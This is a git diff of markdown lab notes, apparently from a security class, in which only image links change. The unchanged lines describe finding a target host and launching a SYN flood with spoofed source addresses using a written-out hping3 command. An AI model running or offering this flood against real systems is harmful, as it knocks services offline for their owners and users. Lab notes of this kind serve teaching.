@@ -33,9 +33,9 @@
 ###### 1, find target by using command "ip addr" on target Computer or "nmap -sn {ip}" on Attack Computer
 ###### 2, In this case we just going to use ip addr on Target Computer
 
-![alt text](https://github.com/LunarstarPony/iPAS-Probably-Would-Win/blob/main/Class_Files/11_17_2020/1.png?raw=true)
+![alt text](https://github.com/LunarstarPony/iPAS/blob/main/Class_Files/11_17_2020/1.png?raw=true)
 
 ###### 3, Start the attack using `hping3 -c 15000 -d 120 -S -w 64 -p 80 --flood --rand-source 172.20.174.138`
 
-![alt text](https://github.com/LunarstarPony/iPAS-Probably-Would-Win/blob/main/Class_Files/11_17_2020/2.png?raw=true)
+![alt text](https://github.com/LunarstarPony/iPAS/blob/main/Class_Files/11_17_2020/2.png?raw=true)
     
